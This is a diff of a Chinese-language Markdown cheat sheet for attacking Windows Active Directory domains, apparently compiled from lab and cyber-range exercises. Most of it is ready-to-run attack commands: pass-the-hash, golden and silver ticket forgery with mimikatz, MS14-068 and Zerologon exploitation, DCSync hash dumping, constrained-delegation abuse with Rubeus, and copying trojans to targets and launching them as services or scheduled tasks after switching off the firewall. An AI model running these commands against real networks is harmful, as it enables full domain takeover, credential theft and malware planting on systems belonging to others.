@@ -1,10 +1,10 @@
 [干货 | 域内敏感信息搜集](https://mp.weixin.qq.com/s/nFOAb__c162gMhve3MEh_Q)
-[横向移动之PTH、PPT、PTK](https://mp.weixin.qq.com/s/uWuNqKYloTQCifKjsXMB2Q)
+[横向移动之 PTH、PPT、PTK](https://mp.weixin.qq.com/s/uWuNqKYloTQCifKjsXMB2Q)
 
 ## 信息收集
 
 ```shell
-net time /domain # 判断当前主机是否在域内
+net time /domain # 判断当前主机是否在域内 -- \\WIN-A46BVNA4HEK.tide1.org,  域主机为 WIN-A46BVNA4HEK
 net user /domain
 获取域内用户的详细信息：
 wmic useraccount get /all
@@ -29,9 +29,11 @@ beacon> net dclist
 ##2. 存在域，并且当前用户是域用户
 ##3. 当前网络环境为工作组，不存在域
 ```
+
 sharehound 查看收集的信息
 
 ## 域维护命令
+
 ```sh
 
 gpmc.msc # 组策略
@@ -45,11 +47,132 @@ net localgroup administrators domain\user /add # 添加用户到管理员
 klist # 看已有票据
 klist purge # 清空票据
 ```
+
+## 域攻击
+
+### 1.PTH 攻击
+
+```sh
+dir \\WIN-3IFR5080HJG.cc.com/\c$
+copy shell.exe \\WIN-3IFR5080HJG.cc.com/\c$ /y
+```
+
+```sh
+# kali 中ping域控要 vi /etc/resolv.conf
+domain localdomain
+search localdomain
+nameserver 192.168.80.100
+ping cc.com
+
+msfconsole
+search smb psexec
+use 112 # exploit/windows/smb/psexec
+
+set rhsots 192.168.80.100
+set smbdomain cc
+set smbuser administrator
+set smbpass 10c7c7894091834u1074eefddcef89ed79ec9f
+# 可以设置 payload 攻击时反弹也可不设置
+```
+
+### 2.黄金票据
+
+需要获取
+
+1. krbtst
+2. hash 和 sid
+
+```sh
+mimikatz伪造账号
+Dir \\域控计算机.xy.com\c$
+Dir \\wn-li5mf2.xy.com\c$
+
+mimikatz.exe "kerberos::golden /user:xyz /domain:cc /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt" exit
+klist
+psexec.exe \\WIN-3IFR5080HJGS.cc.com cmd.exe
+```
+
+### 3.白银票据
+
+需要用到的条件:
+
+1. dc 的 ip 地址
+2. 域的 sid
+3. 域控机的 hash
+4. 伪造票据
+
+```sh
+# 获取域控 hash
+mimikatz.exe "log res2.txt" "privilege::debug" "sekurlsa::logonpasswords" " exit"
+
+# 伪造白银票据
+mimikatz.exe "kerberos::golden /user:xyz /domain:cc /sid:DOMAINSID /target:WIN-3IFR5080HJGS.cc.com /service:cifs /rc4:039f0efddcab03 /ptt" exit # target: 域控主机, rc4是域控机的 ntlm 值, mimikatz中找到 WIN-3IFR5080HJGS$
+```
+
+### 4.MS14-068(KB3011780)
+[L1](https://mp.weixin.qq.com/s/tTuH3_YY_C0AuPSLfo8mTQ) [L2](https://www.freebuf.com/articles/web/340783.html)
+
+```sh
+MS14-068.exe -u xyz@cc.com -p pwd123 -s <sid> -d WIN-3IFR5080HJGS # -d 域控
+mimikatz.exe "kerberos::ptc TGT_cc@cc.com.ccache" exit           # 导入证书
+```
+
+### 5.zerologon CVE-2020-1472
+1. mimikatz - 受限:需要在子域上使用
+```sh
+# 检测
+lsadump::zerologon /target:192.168.61.129 /account:WIN-A46BVNA4HEK$
+# 攻击
+lsadump::zerologon /target:192.168.61.129 /account:WIN-A46BVNA4HEK$ /exploit
+```
+
+python方式 - 不受限
+```sh
+# 测试
+proxychains python3 zerologon_tester.py WIN-3IFR5080HJGS 192.168.80.100
+
+# 置空密码
+proxychains python3 set_empty_pw.py WIN-3IFR5080HJGS 192.168.80.100
+## 方式2 proxychains python3 cve-2020-1472-exploit.py -t 192.168.61.129 -n WIN-A46BVNA4HEK
+# 使用空密码dump域控上的hash
+proxychains python3 secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'cc.com/WIN-3IFR5080HJGS$@192.168.80.100'
+proxychains python3 secretsdump.py 'cc.com/WIN-3IFR5080HJGS$@192.168.80.100' -no-pass
+
+proxychains python3 wmiexec.py -hashes ad3b435b51404eeaad3b435b51404ee:a803cf45d87009c404eb89df4b1ae94c cc/administrator@192.168.80.100
+
+# 获取计算机账号原始 hash
+reg save HKLM\SYSTEM system.save
+reg save HKLM\SAM sam.save
+reg save HKLM\SECURITY security.save
+lget system.save
+lget sam.save
+lget security.save
+del /f system.save
+del /f sam.save
+del /f security.save
+
+# 获取计算机账号的原始 hash
+python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+# 将该原始计算机帐户哈希还原
+python3 reinstall_original_pw.py WIN-3IFR5080HJGS 192.168.80.100 bc6d65e89c2dcdb1996a09d6e1f0083f
+"""
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e3b042707eda06c25e25766ec329fcd9 # 原hash
+"""
+# 查看WIN-3IFR5080HJGS账号的hash，已成功还原
+python3 secretsdump.py cc.com/administrator:123.com@192.168.80.100 -just-dc-user 'WIN-3IFR5080HJGS$'
+# 验证2 proxychains impacket-secretsdump -no-pass -just-dc xiyou.dayu.com/XIYOU\$@10.10.3.6
+```
+### 6.本地用户提权再深入
+hotpotato
+DAY36 内网域渗透 「更新中」.mp4
+
 ## 提权
+
 ```sh
 wmic qfe get hotfixid | findstr KB3011780 # 无补丁  则 ms14-068 提权
 ```
-## 攻击 
+
+## 攻击
 
 ```shell
 # PSTools 使用哈希传递(PTH)攻击 https://mp.weixin.qq.com/s/6BYAeo-5I1XMejyC5ec1pw
@@ -77,9 +200,9 @@ use incognito      //进入incognito模块
 list_tokens -u    //列出令牌
 impersonate_token "WUHANKQ\Administrator"    //选择要窃取的账号
 #验证权限
-shell          
+shell
 chcp 65001      //活动代码页字符为UTF-8编码
-whoami    
+whoami
 
 # mimikatz
 mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" > log.log
@@ -90,78 +213,30 @@ copy c:\phpstudy\srn7final.exe \\192.168.52.138\c$
 设置计划任务启动木马
 schtasks /create /tn "test123456" /tr C:\srn7final.exe /sc once /st 14.25 /S 192.168.52.138 /RU System /u administrator /p "hongrisec@2021"
 ```
-### ms14-068生成票据, 注入票据
-[L1](https://mp.weixin.qq.com/s/tTuH3_YY_C0AuPSLfo8mTQ) [L2](https://www.freebuf.com/articles/web/340783.html)
-
-
-整理信息
-
-```ts
-USER：douser
-Domain：DEMO.COM
-NTLM：bc23b0b4d5bf5ff42bc61fb62e13886e
-SID：S-1-5-21-979886063-1111900045-1414766810-1107
-PASSWORD：Dotest123
-```
-上传MS14-068
-
-```shell
-MS14-068.exe -u douser@DEMO.COM -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130
-dir 
-```
-
-通过 mimikatz 导入TGT票据将写入，从而提升为域管理员
-```bat
-kerberos::purge
-kerberos::ptc TGT_douser@DEMO.COM.ccache
-exit
-
-dir \\WIN-ENS2VR5TR3N\c$
-
-
-:: 通过文件共享将马复制到域控中
-:: 运行方式2 sc , 关闭域控防火墙 上马
-:: cmd 下切换高级用户权限
-net use \\192.168.138.138\ipc$ "dc123.com" /user:"administrator"
-sc \\WIN-ENS2VR5TR3N create ProFirewall binpath= "netsh advfirewall set allprofiles state off"
-sc \\WIN-ENS2VR5TR3N start ProFirewall
-sc \\WIN-ENS2VR5TR3N create Startup binpath= "C:\shell.exe"
-sc \\WIN-ENS2VR5TR3N start Startup
-
-:: 运行方式1 schtasks
-(
-echo netsh advfirewall set allprofiles state off
-echo shell.exe
-) >1.bat
-copy 1.bat \\WIN-ENS2VR5TR3N\c$ /y
-copy shell.exe \\WIN-ENS2VR5TR3N\c$ /y
-:: 运行方式2 schtasks
-schtasks /create /S WIN-ENS2VR5TR3N /TN "test" /TR c:/1.bat /SC MINUTE /ST 21:27 /ru system /f
-
-:: 下一步 psexec
-```
 
 ### shadow-credentials
+
 [Link](https://zhuanlan.zhihu.com/p/581451146)
 
 条件: 以下账户拥有 msDS-KeyCredentialLink 属性的写入权限：
 
-* 域管理员账户
-* Key Admins 组中的账户
-* Enterprise Key Admins 组中的账户
-* 对 Active Directory 中的对象具有 GenericAll 或 GenericWrite 权限的帐户
-* 机器账户对自身的 msDS-KeyCredentialLink 属性拥有写入权限
+- 域管理员账户
+- Key Admins 组中的账户
+- Enterprise Key Admins 组中的账户
+- 对 Active Directory 中的对象具有 GenericAll 或 GenericWrite 权限的帐户
+- 机器账户对自身的 msDS-KeyCredentialLink 属性拥有写入权限
 
-### Dsync攻击 
+### Dsync 攻击
+
 [Dsync](http://www.malabis.site/2022/11/12/春秋云镜-Initial/#横向移动)
 
-DCSync攻击前提 一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：
+DCSync 攻击前提 一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：
 
-* Administrators组内的用户
-* Domain Admins组内的用户
-* Enterprise Admins组内的用户
-* 域控制器的计算机帐户
-* 即：默认情况下域管理员组具有该权限。所以在域渗透中拿到域管理员账号就可以变相拿到整个域的控制权限。
+- Administrators 组内的用户
+- Domain Admins 组内的用户
+- Enterprise Admins 组内的用户
+- 域控制器的计算机帐户
+- 即：默认情况下域管理员组具有该权限。所以在域渗透中拿到域管理员账号就可以变相拿到整个域的控制权限。
 
 ```sh
 meterpreter > load kiwi
@@ -169,7 +244,9 @@ meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
 # 拿到hash后 通过哈希传递 拿到域控
 proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
 ```
-#### 添加 dsync权限, 见 春秋云境——Exchange 
+
+#### 添加 dsync 权限, 见 春秋云境——Exchange
+
 ```
 方式一
 proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :0beff597ee3d7025627b2d9aa015bf4c -action write -rights DCSync -principal Zhangtong -target-dn 'DC=xiaorang,DC=lab' -dc-ip 172.22.3.2
@@ -178,20 +255,17 @@ powershell -command "cd C:/Users/benbi/Desktop/; Import-Module .\powerview.ps1; 
 ```
 
 ### DC Takeover
-[Ichunqiu云境 —— Tsclient Writeup](https://mp.weixin.qq.com/s/1VDwjl_fhpZOKUy5-ZHCTQ)
-### mimikatz PTH传递攻击
+
+[Ichunqiu 云境 —— Tsclient Writeup](https://mp.weixin.qq.com/s/1VDwjl_fhpZOKUy5-ZHCTQ)
+
+### mimikatz PTH 传递攻击
 
 ```sh
-sekurlsa::pth /user:administrator /domain:g1ts /ntlm:ad5a870327c02f83cb947af6a94a4c23
-要先 privilege::debug
-mimikatz.exe "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"
-mimikatz.exe "sekurlsa::pth /user:fuwuqi /domain:172.16.235.6 /ntlm:f9272c84db38a009439ba30fb23ecb2d "/run:mstsc.exe /restrictedadmin"
-
-privilege::debug
-sekurlsa::pth /user:Administrator /domain:. /ntlm:ef39e54205b68e286a65bbe69d2dab92 "/run:mstsc.exe /restrictedadmin"
-
 # pth 传递弹出cmd
 mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:g1ts /ntlm:19b241fc247a06034210b12ae3aca2d9"
+# 本地 /domain:. 如果有域要填好
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:. /ntlm:ef39e54205b68e286a65bbe69d2dab92 /run:mstsc.exe /restrictedadmin" "exit"
+mimikatz.exe sekurlsa::pth /user:fuwuqi /domain:172.16.235.6 /ntlm:f9272c84db38a009439ba30fb23ecb2d /run:mstsc.exe /restrictedadmin
 # pth 读取数据
 proxychains crackmapexec smb 172.22.8.15 -u WIN2016$ -H290b14ec023182beeb4890dbe5b9774b -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
 # pth 攻击
@@ -200,14 +274,16 @@ python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.
 python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
 ```
 
-pth连接后上传马
+pth 连接后上传马
+
 ```sh
 copy 4444.exe \\192.168.3.32\c$\  # 上传木马到目标机器中
 sc \\192.168.3.32 create bindshell binpath= "c:\4444.exe" # 创建shell服务并绑定文件
 sc \\192.168.3.32 start bindshell # 启动bindshell服务
 ```
 
-### pth远程桌面登录
+### pth 远程桌面登录
+
 ```sh
 # mimikatz
 privilege::debug
@@ -218,6 +294,7 @@ xfreerdp /u:administrator /pth:d25ecd13fddbb542d2e16da4f9e0333d /v:192.168.62.13
 ```
 
 ### 约束委派攻击
+
 [1](https://mp.weixin.qq.com/s/O2LC0Qk55AAOqLGTJmzISg)
 [2](https://zhuanlan.zhihu.com/p/581577873)
 
@@ -225,31 +302,42 @@ xfreerdp /u:administrator /pth:d25ecd13fddbb542d2e16da4f9e0333d /v:192.168.62.13
 meterpreter > load kiwi
 meterpreter > creds_all
 ```
+
 约束委派攻击
-* 1. 通过Rubeus申请机器账户MSSQLSERVER的TGT
+
+- 1. 通过 Rubeus 申请机器账户 MSSQLSERVER 的 TGT
 
 ```bash
 Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:<NTLM> /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap
 ```
-* 2. 然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中
+
+- 2. 然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中
+
 ```bash
 Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjC....==
 ```
-* 3. LDAP 服务具有DCSync权限，导出域内用户的Hash
+
+- 3. LDAP 服务具有 DCSync 权限，导出域内用户的 Hash
+
 ```bash
 mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
     kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
 # 获得域管理员哈希 1a19251fbd935969832616366ae3fe62
 ```
-* 4. WMI横向 登录域控
+
+- 4. WMI 横向 登录域控
+
 ```
 python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
 ```
-## Tool
-### Rubeus
-Rubeus是用于测试Kerberos的利用工具。
 
-Rubeus kerberoast 查看哪些域用户注册了SPN，也为后续Kerberoasting做准备：
+## Tool
+
+### Rubeus
+
+Rubeus 是用于测试 Kerberos 的利用工具。
+
+Rubeus kerberoast 查看哪些域用户注册了 SPN，也为后续 Kerberoasting 做准备：
 
 ```sh
 .\Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$
@@ -267,7 +355,9 @@ net use P: \\Name\zhq3211
 ```
 
 ## 票据
-###  TGT（黄金票据）
+
+### TGT（黄金票据）
+
 [Link](https://blog.csdn.net/lza20001103/article/details/127113346)
 
 黄金票据影响整个域上的所有服务的
@@ -275,21 +365,34 @@ net use P: \\Name\zhq3211
 制作金票的条件：
 
 域名称
-- 域的SID值
-- 域KRBTGT账号密码HASH
+
+- 域的 SID 值
+- 域 KRBTGT 账号密码 HASH
 - 伪造用户名，可以是任意的
 - 利用步骤：
 
 域名称 shell whoami
-- 域的SID值 shell whoami /all
-- 域KRBTGT账号密码HASH
-- mimikatz lsadump::dcsync /user:krbtgt@god.org (de1ay.com是一个域名)
+
+- 域的 SID 值 shell whoami /all
+- 域 KRBTGT 账号密码 HASH
+- mimikatz lsadump::dcsync /user:krbtgt@god.org (de1ay.com 是一个域名)
 - 这条命令可以是域内的用户就执行的了，不需要管理员权限，我们可以伪造票据，得到域控的权限从而获取整个域内的权限
 
-利用cs内置的模块（黄金票据伪造）
-- 设置伪造的用户，域名称，域SID，域内普通用户的HASH值，进行build
+利用 cs 内置的模块（黄金票据伪造）
 
+- 设置伪造的用户，域名称，域 SID，域内普通用户的 HASH 值，进行 build
+
+# Tools
+
+## impacket/wmiexec.py
+```sh
+ lcd {path}                 - changes the current local directory to {path}
+ exit                       - terminates the server process (and this session)
+ lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
+ lget {file}                 - downloads pathname to the current local dir
+ ! {cmd}                    - executes a local shell cmd
+```
 # Article
 
-[域内定位个人PC的三种方式](https://mp.weixin.qq.com/s/uXTo2AbmvMeNesR8rAjImw)
+[域内定位个人 PC 的三种方式](https://mp.weixin.qq.com/s/uXTo2AbmvMeNesR8rAjImw)
 [【内网域渗透系列教程】](https://www.bilibili.com/video/BV1xb4y1y7ju/)
